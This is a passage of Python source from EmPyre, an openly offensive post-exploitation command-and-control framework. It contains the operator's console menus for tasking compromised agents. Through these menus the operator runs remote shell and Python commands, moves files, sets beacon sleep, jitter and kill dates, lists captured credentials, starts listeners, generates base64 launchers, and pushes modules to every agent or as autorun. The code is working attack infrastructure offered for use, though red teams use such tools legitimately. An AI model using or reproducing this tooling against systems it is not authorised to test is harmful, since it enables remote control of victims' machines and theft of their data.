        names = self.mainMenu.agents.get_agent_names() + ["all", "autorun"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_remove(self, text, line, begidx, endidx):
        "Tab-complete a remove command"

        names = self.mainMenu.agents.get_agent_names() + ["all", "stale"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_list(self, text, line, begidx, endidx):
        "Tab-complete a list command"

        options = ["stale"]
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in options if s.startswith(mline)]

    def complete_kill(self, text, line, begidx, endidx):
        "Tab-complete a kill command"

        return self.complete_clear(text, line, begidx, endidx)

    def complete_sleep(self, text, line, begidx, endidx):
        "Tab-complete a sleep command"

        return self.complete_clear(text, line, begidx, endidx)

    def complete_lostlimit(self, text, line, begidx, endidx):
        "Tab-complete a lostlimit command"

        return self.complete_clear(text, line, begidx, endidx)

    def complete_killdate(self, text, line, begidx, endidx):
        "Tab-complete a killdate command"

        return self.complete_clear(text, line, begidx, endidx)

    def complete_workinghours(self, text, line, begidx, endidx):
        "Tab-complete a workinghours command"

        return self.complete_clear(text, line, begidx, endidx)

    def complete_usemodule(self, text, line, begidx, endidx):
        "Tab-complete an EmPyre Python module path"
        return self.mainMenu.complete_usemodule(text, line, begidx, endidx)

    def complete_usestager(self, text, line, begidx, endidx):
        "Tab-complete an EmPyre stager module path."
        return self.mainMenu.complete_usestager(text, line, begidx, endidx)

    def complete_creds(self, text, line, begidx, endidx):
        "Tab-complete 'creds' commands."
        return self.mainMenu.complete_creds(text, line, begidx, endidx)

class AgentMenu(cmd.Cmd):

    def __init__(self, mainMenu, sessionID):

        cmd.Cmd.__init__(self)

        self.mainMenu = mainMenu

        self.sessionID = sessionID

        self.doc_header = 'Agent Commands'

        # try to resolve the sessionID to a name
        name = self.mainMenu.agents.get_agent_name(sessionID)

        # set the text prompt
        self.prompt = '(EmPyre: '+helpers.color(name, 'red')+') > '

        # listen for messages from this specific agent
        dispatcher.connect(self.handle_agent_event, sender=dispatcher.Any)

        # display any results from the database that were stored
        # while we weren't interacting with the agent
        results = self.mainMenu.agents.get_agent_results(self.sessionID)
        if results:
            print "\n" + results.rstrip('\r\n')

    # def preloop(self):
    #     traceback.print_stack()

    def handle_agent_event(self, signal, sender):
        """
        Handle agent event signals.
        """
        if "[!] Agent" in signal and "exiting" in signal: pass

        name = self.mainMenu.agents.get_agent_name(self.sessionID)

        if (str(self.sessionID) + " returned results" in signal) or (str(name) + " returned results" in signal):
            # display any results returned by this agent that are returned
            # while we are interacting with it
            results = self.mainMenu.agents.get_agent_results(self.sessionID)
            if results:
                print "\n" + results

        elif "[+] Part of file" in signal and "saved" in signal:
            if (str(self.sessionID) in signal) or (str(name) in signal):
                print helpers.color(signal)

    # print a nicely formatted help menu
    #   stolen/adapted from recon-ng
    def print_topics(self, header, cmds, cmdlen, maxcol):
        if cmds:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for c in cmds:
                self.stdout.write("%s %s\n" % (c.ljust(17), getattr(self, 'do_' + c).__doc__))
            self.stdout.write("\n")

    def emptyline(self): pass

    def default(self, line):
        "Default handler"

        print helpers.color("[!] Command not recognized, use 'help' to see available commands")

    def do_back(self, line):
        "Go back a menu."
        return True

    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()

    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()

    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_help(self, *args):
        "Displays the help menu or syntax for particular commands."
        cmd.Cmd.do_help(self, *args)

    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(" ".join(line.split(" ")[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(" ".join(line.split(" ")[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")

    def do_rename(self, line):
        "Rename the agent."

        parts = line.strip().split(" ")
        oldname = self.mainMenu.agents.get_agent_name(self.sessionID)

        # name sure we get a new name to rename this agent
        if len(parts) == 1:
            # replace the old name with the new name
            result = self.mainMenu.agents.rename_agent(oldname, parts[0])
            if result:
                self.prompt = "(EmPyre: "+helpers.color(parts[0], 'red')+") > "
        else:
            print helpers.color("[!] Please enter a new name for the agent")

    def do_info(self, line):
        "Display information about this agent"

        # get the agent name, if applicable
        agent = self.mainMenu.agents.get_agent(self.sessionID)
        messages.display_agent(agent)

    def do_exit(self, line):
        "Task agent to exit."

        try:
            choice = raw_input(helpers.color("[>] Task agent to exit? [y/N] ", "red"))
            if choice.lower() != "" and choice.lower()[0] == "y":

                self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_EXIT")
                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to exit")
                return True

        except KeyboardInterrupt as e:
            print ""

    def do_clear(self, line):
        "Clear out agent tasking."
        self.mainMenu.agents.clear_agent_tasks(self.sessionID)

    def do_cd(self, line):
        "Change an agent's active directory"

        line = line.strip()

        if line != "":
            # have to be careful with inline python and no threading
            # this can cause the agent to crash so we will use try / cath
            # task the agent with this shell command
            if line == "..":
                self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir(os.pardir); print "Directory stepped down: %s"' % (line))
            else:
                self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", 'import os; os.chdir("%s"); print "Directory changed to: %s"' % (line, line))
            # update the agent log
            msg = "Tasked agent to change active directory to: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_jobs(self, line):
        "Return jobs or kill a running job."

        parts = line.split(" ")

        if len(parts) == 1:
            if parts[0] == '':
                self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_GETJOBS")
                # update the agent log
                self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get running jobs")
            else:
                print helpers.color("[!] Please use form 'jobs kill JOB_ID'")
        elif len(parts) == 2:
            jobID = parts[1].strip()
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_STOPJOB", jobID)
            # update the agent log
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to stop job " + str(jobID))

    def do_sleep(self, line):
        "Task an agent to 'sleep interval [jitter]'"

        parts = line.strip().split(" ")
        delay = parts[0]

        # make sure we pass a int()
        if len(parts) >= 1:
            try:
                int(delay)
            except:
                print helpers.color("[!] Please only enter integer for 'interval'")
                return

        if len(parts) > 1:
            try:
                int(parts[1])
            except:
                print helpers.color("[!] Please only enter integer for '[jitter]'")
                return

        if delay == "":
            # task the agent to display the delay/jitter
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; print 'delay/jitter = ' + str(delay)+'/'+str(jitter)")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display delay/jitter")

        elif len(parts) > 0 and parts[0] != "":
            delay = parts[0]
            jitter = 0.0
            if len(parts) == 2:
                jitter = parts[1]

            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field("delay", delay, self.sessionID)
            self.mainMenu.agents.set_agent_field("jitter", jitter, self.sessionID)

            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", "global delay; global jitter; delay=%s; jitter=%s; print 'delay/jitter set to %s/%s'" % (delay, jitter, delay, jitter))

            # update the agent log
            msg = "Tasked agent to delay sleep/jitter " + str(delay) + "/" + str(jitter)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_lostlimit(self, line):
        "Task an agent to display change the limit on lost agent detection"

        parts = line.strip().split(" ")
        lostLimit = parts[0]

        if lostLimit == "":
            # task the agent to display the lostLimit
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", "global lostLimit; print 'lostLimit = ' + str(lostLimit)")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display lost limit")
        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field("lost_limit", lostLimit, self.sessionID)

            # task the agent with the new lostLimit
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", "global lostLimit; lostLimit=%s; print 'lostLimit set to %s'"%(lostLimit, lostLimit))

            # update the agent log
            msg = "Tasked agent to change lost limit " + str(lostLimit)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_killdate(self, line):
        "Get or set an agent's killdate (01/01/2016)."

        parts = line.strip().split(" ")
        killDate = parts[0]

        if killDate == "":

            # task the agent to display the killdate
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", "global killDate; print 'killDate = ' + str(killDate)")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to display killDate")
        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field("kill_date", killDate, self.sessionID)

            # task the agent with the new killDate
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", "global killDate; killDate='%s'; print 'killDate set to %s'" % (killDate, killDate))

            # update the agent log
            msg = "Tasked agent to set killdate to %s" %(killDate)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_workinghours(self, line):
        "Get or set an agent's working hours (9:00-17:00)."

        parts = line.strip().split(" ")
        hours = parts[0]

        if hours == "":
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", "global workingHours; print 'workingHours = ' + str(workingHours)")
            self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get working hours")

        else:
            # update this agent's information in the database
            self.mainMenu.agents.set_agent_field("working_hours", hours, self.sessionID)

            # task the agent with the new working hours
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", "global workingHours; workingHours= '%s'"%(hours))

            # update the agent log
            msg = "Tasked agent to set working hours to: %s" % (hours)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_shell(self, line):
        "Task an agent to use a shell command."

        line = line.strip()

        if line != "":
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_SHELL", str(line))
            # update the agent log
            msg = "Tasked agent to run shell command: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_python(self, line):
        "Task an agent to run a Python command."

        line = line.strip()

        if line != "":
            # task the agent with this shell command
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_CMD_WAIT", str(line))
            # update the agent log
            msg = "Tasked agent to run Python command %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_sysinfo(self, line):
        "Task an agent to get system information."

        # task the agent with this shell command
        self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_SYSINFO")
        # update the agent log
        self.mainMenu.agents.save_agent_log(self.sessionID, "Tasked agent to get system information")

    def do_download(self, line):
        "Task an agent to download a file."

        line = line.strip()

        if line != "":
            self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_DOWNLOAD", line)
            # update the agent log
            msg = "Tasked agent to download: %s" % (line)
            self.mainMenu.agents.save_agent_log(self.sessionID, msg)

    def do_upload(self, line):
        "Task an agent to upload a file."

        # "upload /path/file.ext" or "upload /path/file/file.ext newfile.ext"
        # absolute paths accepted
        parts = line.strip().split(" ")
        uploadname = ""

        if len(parts) > 0 and parts[0] != "":
            if len(parts) == 1:
                # if we're uploading the file with its original name
                uploadname = os.path.basename(parts[0])
            else:
                # if we're uploading the file as a different name
                uploadname = parts[1].strip()

            if parts[0] != "" and os.path.exists(parts[0]):
                # read in the file and base64 encode it for transport
                f = open(parts[0], 'r')
                fileData = f.read()
                f.close()

                msg = "Tasked agent to upload " + parts[0] + " : " + hashlib.md5(fileData).hexdigest()
                # update the agent log with the filename and MD5
                self.mainMenu.agents.save_agent_log(self.sessionID, msg)

                fileData = helpers.encode_base64(fileData)
                # upload packets -> "filename | script data"
                data = uploadname + "|" + fileData
                self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_UPLOAD", data)
            else:
                print helpers.color("[!] Please enter a valid file path to upload")

    def do_usemodule(self, line):
        "Use an EmPyre Python module."

        module = line.strip()

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            l = ModuleMenu(self.mainMenu, line, agent=self.sessionID)
            l.cmdloop()

    def do_searchmodule(self, line):
        "Search EmPyre module names/descriptions."

        searchTerm = line.strip()

        if searchTerm.strip() == "":
            print helpers.color("[!] Please enter a search term.")
        else:
            self.mainMenu.modules.search_modules(searchTerm)

    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)

    # def do_updateprofile(self, line):
    #     "Update an agent connection profile."
    #     # TODO: implement

    def complete_usemodule(self, text, line, begidx, endidx):
        "Tab-complete an EmPyre Python module path"
        return self.mainMenu.complete_usemodule(text, line, begidx, endidx)

    def complete_upload(self, text, line, begidx, endidx):
        "Tab-complete an upload file path"
        return helpers.complete_path(text, line)

    # def complete_updateprofile(self, text, line, begidx, endidx):
    #     "Tab-complete an updateprofile path"
    #     return helpers.complete_path(text,line)


class ListenerMenu(cmd.Cmd):

    def __init__(self, mainMenu):
        cmd.Cmd.__init__(self)
        self.doc_header = 'Listener Commands'

        self.mainMenu = mainMenu

        # get all the the stock listener options
        self.options = self.mainMenu.listeners.get_listener_options()

        # set the prompt text
        self.prompt = '(EmPyre: '+helpers.color("listeners", color="blue")+') > '

        # display all active listeners on menu startup
        messages.display_listeners(self.mainMenu.listeners.get_listeners())

    # def preloop(self):
    #     traceback.print_stack()

    # print a nicely formatted help menu
    # stolen/adapted from recon-ng
    def print_topics(self, header, cmds, cmdlen, maxcol):
        if cmds:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for c in cmds:
                self.stdout.write("%s %s\n" % (c.ljust(17), getattr(self, 'do_' + c).__doc__))
            self.stdout.write("\n")

    def emptyline(self): pass

    def do_exit(self, line):
        "Exit EmPyre."
        raise KeyboardInterrupt

    def do_list(self, line):
        "List all active listeners (or agents)."

        if line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(" ".join(line.split(" ")[1:])))
        elif line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(" ".join(line.split(" ")[1:])))
        else:
            self.mainMenu.do_list("listeners " + str(line))

    def do_back(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()

    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_exit(self, line):
        "Exit EmPyre."
        raise KeyboardInterrupt

    def do_set(self, line):
        "Set a listener option."
        parts = line.split(" ")
        if len(parts) > 1:
            if parts[0].lower() == "defaultprofile" and os.path.exists(parts[1]):
                try:
                    f = open(parts[1], 'r')
                    profileDataRaw = f.readlines()
                    
                    profileData = [l for l in profileDataRaw if (not l.startswith("#") and l.strip() != "")]
                    profileData = profileData[0].strip("\"")

                    f.close()
                    self.mainMenu.listeners.set_listener_option(parts[0], profileData)
                except:
                    print helpers.color("[!] Error opening profile file %s" %(parts[1]))
            else:
                self.mainMenu.listeners.set_listener_option(parts[0], " ".join(parts[1:]))
        else:
            print helpers.color("[!] Please enter a value to set for the option")

    def do_unset(self, line):
        "Unset a listener option."
        option = line.strip()
        self.mainMenu.listeners.set_listener_option(option, '')

    def do_info(self, line):
        "Display listener options."

        parts = line.split(" ")

        if parts[0] != '':
            if self.mainMenu.listeners.is_listener_valid(parts[0]):
                listener = self.mainMenu.listeners.get_listener(parts[0])
                messages.display_listener_database(listener)
            else:
                print helpers.color("[!] Please enter a valid listener name or ID")
        else:
            messages.display_listener(self.mainMenu.listeners.options)

    def do_options(self, line):
        "Display listener options."

        parts = line.split(" ")

        if parts[0] != '':
            if self.mainMenu.listeners.is_listener_valid(parts[0]):
                listener = self.mainMenu.listeners.get_listener(parts[0])
                messages.display_listener_database(listener)
            else:
                print helpers.color("[!] Please enter a valid listener name or ID")
        else:
            messages.display_listener(self.mainMenu.listeners.options)

    def do_kill(self, line):
        "Kill one or all active listeners."

        listenerID = line.strip()

        if listenerID.lower() == "all":
            try:
                choice = raw_input(helpers.color("[>] Kill all listeners? [y/N] ", "red"))
                if choice.lower() != "" and choice.lower()[0] == "y":
                    self.mainMenu.listeners.killall()
            except KeyboardInterrupt as e:
                print ""

        else:
            if listenerID != "" and self.mainMenu.listeners.is_listener_valid(listenerID):
                self.mainMenu.listeners.shutdown_listener(listenerID)
                self.mainMenu.listeners.delete_listener(listenerID)
            else:
                print helpers.color("[!] Invalid listener name or ID.")

    def do_execute(self, line):
        "Execute a listener with the currently specified options."
        (success, message) = self.mainMenu.listeners.add_listener_from_config()
        if success:
            print helpers.color("[*] Listener '%s' successfully started." %(message))
        else:
            print helpers.color("[!] %s" %(message))

    def do_run(self, line):
        "Execute a listener with the currently specified options."
        self.do_execute(line)

    def do_usestager(self, line):
        "Use an EmPyre stager."

        parts = line.split(" ")

        if parts[0] not in self.mainMenu.stagers.stagers:
            print helpers.color("[!] Error: invalid stager module")

        elif len(parts) == 1:
            l = StagerMenu(self.mainMenu, parts[0])
            l.cmdloop()
        elif len(parts) == 2:
            listener = parts[1]
            if not self.mainMenu.listeners.is_listener_valid(listener):
                print helpers.color("[!] Please enter a valid listener name or ID")
            else:
                self.mainMenu.stagers.set_stager_option('Listener', listener)
                l = StagerMenu(self.mainMenu, parts[0])
                l.cmdloop()
        else:
            print helpers.color("[!] Error in ListenerMenu's do_userstager()")

    def do_launcher(self, line):
        "Generate an initial launcher for a listener."

        nameid = self.mainMenu.listeners.get_listener_id(line.strip())
        if nameid:
            listenerID = nameid
        else:
            listenerID = line.strip()

        if listenerID != "" and self.mainMenu.listeners.is_listener_valid(listenerID):
            # set the listener value for the launcher
            stager = self.mainMenu.stagers.stagers["launcher"]
            stager.options['Listener']['Value'] = listenerID
            stager.options['Base64']['Value'] = "True"

            # and generate the code
            print stager.generate()
        else:
            print helpers.color("[!] Please enter a valid listenerID")

    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete listener option values."

        if line.split(" ")[1].lower() == "host":
            return ["http://" + helpers.lhost()]

        elif line.split(" ")[1].lower() == "redirecttarget":
            # if we're tab-completing a listener name, return all the names
            listenerNames = self.mainMenu.listeners.get_listener_names()

            endLine = " ".join(line.split(" ")[1:])
            mline = endLine.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]

        elif line.split(" ")[1].lower() == "type":
            # if we're tab-completing the listener type
            listenerTypes = ["native", "pivot", "hop", "foreign", "meter"]
            endLine = " ".join(line.split(" ")[1:])
            mline = endLine.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerTypes if s.startswith(mline)]

        elif line.split(" ")[1].lower() == "certpath":
            return helpers.complete_path(text, line, arg=True)

        elif line.split(" ")[1].lower() == "defaultprofile":
            return helpers.complete_path(text, line, arg=True)

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.options if s.startswith(mline)]

    def complete_unset(self, text, line, begidx, endidx):
        "Tab-complete listener option values."

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.options if s.startswith(mline)]

    def complete_usestager(self, text, line, begidx, endidx):
        "Tab-complete an EmPyre stager module path."
        return self.mainMenu.complete_usestager(text, line, begidx, endidx)

    def complete_kill(self, text, line, begidx, endidx):
        "Tab-complete listener names"

        # get all the listener names
        names = self.mainMenu.listeners.get_listener_names() + ["all"]

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_launcher(self, text, line, begidx, endidx):
        "Tab-complete listener names/IDs"

        # get all the listener names
        names = self.mainMenu.listeners.get_listener_names()

        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in names if s.startswith(mline)]

    def complete_info(self, text, line, begidx, endidx):
        "Tab-complete listener names/IDs"
        return self.complete_launcher(text, line, begidx, endidx)

    def complete_options(self, text, line, begidx, endidx):
        "Tab-complete listener names/IDs"
        return self.complete_launcher(text, line, begidx, endidx)


class ModuleMenu(cmd.Cmd):

    def __init__(self, mainMenu, moduleName, agent=None):
        cmd.Cmd.__init__(self)
        self.doc_header = 'Module Commands'

        self.mainMenu = mainMenu

        # get the current module/name
        self.moduleName = moduleName
        self.module = self.mainMenu.modules.modules[moduleName]

        # set the prompt text
        self.prompt = '(EmPyre: '+helpers.color(self.moduleName, color="blue")+') > '

        # if this menu is being called from an agent menu
        if agent:
            # resolve the agent sessionID to a name, if applicable
            agent = self.mainMenu.agents.get_agent_name(agent)
            self.module.options['Agent']['Value'] = agent

    # def preloop(self):
    #     traceback.print_stack()

    def validate_options(self):
        "Make sure all required module options are completed."

        sessionID = self.module.options['Agent']['Value']

        for option, values in self.module.options.iteritems():
            if values['Required'] and ((not values['Value']) or (values['Value'] == '')):
                print helpers.color("[!] Error: Required module option missing.")
                return False

        # # TODO: implement this all/autorun check
        # try:
        #     # if we're running this module for all agents, skip this validation
        #     if sessionID.lower() != "all" and sessionID.lower() != "autorun": 
        #         modulePSVersion = int(self.module.info['MinPSVersion'])
        #         agentPSVersion = int(self.mainMenu.agents.get_ps_version(sessionID))
        #         # check if the agent/module PowerShell versions are compatible
        #         if modulePSVersion > agentPSVersion:
        #             print helpers.color("[!] Error: module requires PS version "+str(modulePSVersion)+" but agent running PS version "+str(agentPSVersion))
        #             return False
        # except Exception as e:
        #     print helpers.color("[!] Invalid module or agent PS version!")
        #     return False

        # check if the module needs admin privs
        if self.module.info['NeedsAdmin']:
            # if we're running this module for all agents, skip this validation
            if sessionID.lower() != "all" and sessionID.lower() != "autorun":
                if not self.mainMenu.agents.is_agent_elevated(sessionID):
                    print helpers.color("[!] Error: module needs to run in an elevated context.")
                    return False

        # if the module isn't opsec safe, prompt before running
        if not self.module.info['OpsecSafe']:
            try:
                choice = raw_input(helpers.color("[>] Module is not opsec safe, run? [y/N] ", "red"))
                if not (choice.lower() != "" and choice.lower()[0] == "y"):
                    return False
            except KeyboardInterrupt:
                print ""
                return False

        return True

    def emptyline(self): pass

    # print a nicely formatted help menu
    # stolen/adapted from recon-ng
    def print_topics(self, header, cmds, cmdlen, maxcol):
        if cmds:
            self.stdout.write("%s\n" % str(header))
            if self.ruler:
                self.stdout.write("%s\n" % str(self.ruler * len(header)))
            for c in cmds:
                self.stdout.write("%s %s\n" % (c.ljust(17), getattr(self, 'do_' + c).__doc__))
            self.stdout.write("\n")

    def do_back(self, line):
        "Go back a menu."
        return True

    def do_agents(self, line):
        "Jump to the Agents menu."
        raise NavAgents()

    def do_listeners(self, line):
        "Jump to the listeners menu."
        raise NavListeners()

    def do_main(self, line):
        "Go back to the main menu."
        raise NavMain()

    def do_exit(self, line):
        "Exit EmPyre."
        raise KeyboardInterrupt

    def do_list(self, line):
        "Lists all active agents (or listeners)."

        if line.lower().startswith("listeners"):
            self.mainMenu.do_list("listeners " + str(" ".join(line.split(" ")[1:])))
        elif line.lower().startswith("agents"):
            self.mainMenu.do_list("agents " + str(" ".join(line.split(" ")[1:])))
        else:
            print helpers.color("[!] Please use 'list [agents/listeners] <modifier>'.")

    def do_reload(self, line):
        "Reload the current module."

        print "\n" + helpers.color("[*] Reloading module") + "\n"

        # reload the specific module
        self.mainMenu.modules.reload_module(self.moduleName)
        # regrab the reference
        self.module = self.mainMenu.modules.modules[self.moduleName]

    def do_info(self, line):
        "Display module options."
        messages.display_module(self.moduleName, self.module)

    def do_options(self, line):
        "Display module options."
        messages.display_module(self.moduleName, self.module)

    def do_set(self, line):
        "Set a module option."

        parts = line.split()

        try:
            option = parts[0]
            if option not in self.module.options:
                print helpers.color("[!] Invalid option specified.")

            elif len(parts) == 1:
                # "set OPTION"
                # check if we're setting a switch
                if self.module.options[option]['Description'].startswith("Switch."):
                    self.module.options[option]['Value'] = "True"
                else:
                    print helpers.color("[!] Please specify an option value.")
            else:
                # otherwise "set OPTION VALUE"
                option = parts[0]
                value = " ".join(parts[1:])

                if value == '""' or value == "''":
                    value = ""

                self.module.options[option]['Value'] = value
        except:
            print helpers.color("[!] Error in setting option, likely invalid option name.")

    def do_unset(self, line):
        "Unset a module option."

        option = line.split()[0]

        if line.lower() == "all":
            for option in self.module.options:
                self.module.options[option]['Value'] = ''
        if option not in self.module.options:
            print helpers.color("[!] Invalid option specified.")
        else:
            self.module.options[option]['Value'] = ''

    def do_usemodule(self, line):
        "Use an EmPyre Python module."

        module = line.strip()

        if module not in self.mainMenu.modules.modules:
            print helpers.color("[!] Error: invalid module")
        else:
            l = ModuleMenu(self.mainMenu, line, agent=self.module.options['Agent']['Value'])
            l.cmdloop()

    def do_creds(self, line):
        "Display/return credentials from the database."
        self.mainMenu.do_creds(line)

    def do_execute(self, line):
        "Execute the given EmPyre module."

        if not self.validate_options():
            return

        agentName = self.module.options['Agent']['Value']
        try:
            moduleData = self.module.generate()
        except Exception as e:
            moduleData = False
            moduleError = e

        if not moduleData or moduleData == "":
            print helpers.color("[!] Error: module produced an empty script")
            print helpers.color("[!] Error Building module: " + str(moduleError), color="yellow")
            dispatcher.send("[!] Error: module produced an empty script", sender="EmPyre")
            return

        try:
            moduleData.decode('ascii')
        except UnicodeDecodeError:
            print helpers.color("[!] Error: module source contains non-ascii characters")
            return

        # strip all comments from the module
        moduleData = helpers.strip_python_comments(moduleData)

        taskCommand = ""

        # check for opt tasking methods to prevent using a try/catch block
        # elif dose not support try/catch native 
        try:
            if str(self.module.info['RunOnDisk']).lower() == "true":
                RunOnDisk = True
            if str(self.module.info['RunOnDisk']).lower() == "false":
                RunOnDisk = False
        except:
            RunOnDisk = False
            pass

        # build the appropriate task command and module data blob
        if str(self.module.info['Background']).lower() == "true":
            # if this module should be run in the background
            extention = self.module.info['OutputExtension']
            if extention and extention != "":
                # if this module needs to save its file output to the server
                #   format- [15 chars of prefix][5 chars extension][data]
                saveFilePrefix = self.moduleName.split("/")[-1]
                moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                taskCommand = "TASK_CMD_JOB_SAVE"
            else:
                taskCommand = "TASK_CMD_JOB"
        elif RunOnDisk:
            # if this module is run on disk
            extention = self.module.info['OutputExtension']
            if self.module.info['OutputExtension'] and self.module.info['OutputExtension'] != "":
                # if this module needs to save its file output to the server
                #   format- [15 chars of prefix][5 chars extension][data]
                saveFilePrefix = self.moduleName.split("/")[-1][:15]
                moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                taskCommand = "TASK_CMD_WAIT_SAVE"
            else:
                taskCommand = "TASK_CMD_WAIT_DISK"
        else:
            # if this module is run in the foreground
            extention = self.module.info['OutputExtension']
            if self.module.info['OutputExtension'] and self.module.info['OutputExtension'] != "":
                # if this module needs to save its file output to the server
                #   format- [15 chars of prefix][5 chars extension][data]
                saveFilePrefix = self.moduleName.split("/")[-1][:15]
                moduleData = saveFilePrefix.rjust(15) + extention.rjust(5) + moduleData
                taskCommand = "TASK_CMD_WAIT_SAVE"
            else:
                taskCommand = "TASK_CMD_WAIT"

        # if we're running the module on all modules
        if agentName.lower() == "all":
            try:
                choice = raw_input(helpers.color("[>] Run module on all agents? [y/N] ", "red"))
                if choice.lower() != "" and choice.lower()[0] == "y":

                    # signal everyone with what we're doing
                    print helpers.color("[*] Tasking all agents to run " + self.moduleName)
                    dispatcher.send("[*] Tasking all agents to run " + self.moduleName, sender="EmPyre")

                    # actually task the agents
                    for agent in self.mainMenu.agents.get_agents():

                        sessionID = agent[1]

                        # set the agent's tasking in the cache
                        self.mainMenu.agents.add_agent_task(sessionID, taskCommand, moduleData)

                        # update the agent log
                        dispatcher.send("[*] Tasked agent "+sessionID+" to run module " + self.moduleName, sender="EmPyre")
                        msg = "Tasked agent to run module " + self.moduleName
                        self.mainMenu.agents.save_agent_log(sessionID, msg)

            except KeyboardInterrupt as e:
                print ""

        # set the script to be the global autorun
        elif agentName.lower() == "autorun":

            self.mainMenu.agents.set_autoruns(taskCommand, moduleData)
            dispatcher.send("[*] Set module " + self.moduleName + " to be global script autorun.", sender="EmPyre")

        else:
            if not self.mainMenu.agents.is_agent_present(agentName):
                print helpers.color("[!] Invalid agent name.")
            else:
                # set the agent's tasking in the cache
                self.mainMenu.agents.add_agent_task(agentName, taskCommand, moduleData)

                # update the agent log
                dispatcher.send("[*] Tasked agent "+agentName+" to run module " + self.moduleName, sender="EmPyre")
                msg = "Tasked agent to run module " + self.moduleName
                self.mainMenu.agents.save_agent_log(agentName, msg)

    def do_run(self, line):
        "Execute the given EmPyre module."
        self.do_execute(line)

    def complete_set(self, text, line, begidx, endidx):
        "Tab-complete a module option to set."

        options = self.module.options.keys()

        if line.split(" ")[1].lower() == "agent":
            # if we're tab-completing "agent", return the agent names
            agentNames = self.mainMenu.agents.get_agent_names() + ["all", "autorun"]
            endLine = " ".join(line.split(" ")[1:])

            mline = endLine.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in agentNames if s.startswith(mline)]

        elif line.split(" ")[1].lower() == "listener":
            # if we're tab-completing a listener name, return all the names
            listenerNames = self.mainMenu.listeners.get_listener_names()
            endLine = " ".join(line.split(" ")[1:])

            mline = endLine.partition(' ')[2]
            offs = len(mline) - len(text)
            return [s[offs:] for s in listenerNames if s.startswith(mline)]

        elif line.split(" ")[1].lower().endswith("path"):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(" ")[1].lower().endswith("file"):
            return helpers.complete_path(text, line, arg=True)

        elif line.split(" ")[1].lower().endswith("host"):
            return [helpers.lhost()]

